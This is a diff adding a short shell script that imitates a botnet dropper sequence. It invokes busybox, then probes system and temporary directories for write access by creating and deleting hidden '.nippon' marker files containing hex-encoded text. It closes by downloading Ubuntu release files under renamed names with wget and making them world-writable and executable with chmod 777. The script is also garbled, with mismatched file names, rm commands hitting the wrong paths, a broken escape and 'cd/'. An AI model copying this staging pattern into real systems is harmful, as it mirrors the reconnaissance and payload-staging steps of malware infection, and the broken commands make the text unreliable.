@@ -1,0 +1,40 @@
+/bin/busybox cp
+/gweerwe323f
+mount
+
+echo -e '\x47\x72\x6f\x70/dev' > /dev/.nippon
+cat /dev/.nippon
+rm -f /dev/.nippon
+
+echo -e ' x47 x72 x6f x70/dev/shm' > /dev/shm/
+cat /dev/shm/.nippon
+rm -f /dev/shm/.nippon
+
+echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon
+cat /dev/pts/.nippon
+rm -f /dev/pts/.nippon
+
+echo -e '\x47\x72\x6f\x70/' > //.nippon
+cat //.nippon
+rm -f //.nippon
+
+echo -e '\x47\x72\x6f\x70/tmp' > /tmp/.nippom
+cat /tmp/.nippon
+rm -f /tmp/.nippon
+
+echo -e '\x47\x72\x6f\x70/var/tmp' > /var/tmp/.nippon
+cat /var/tmp/.nippon
+rm -f /tmp/.nippon
+
+echo -e '\x47\x72\x6f\x70/lib/init/rw' > /lib/init/rw/.nippon
+cat /lib/init/rw/.nippon
+rm -f /var/tmp/.nippon
+
+cd/
+wget https://releases.ubuntu.com/18.04/SHA256SUMS -O - > sha256
+chmod 777 sha256
+
+wget https://releases.ubuntu.com/18.04/ubuntu-18.04.6-desktop-amd64.iso -O -> ubunserver
+chmod 777 ubunserver
+
+exit
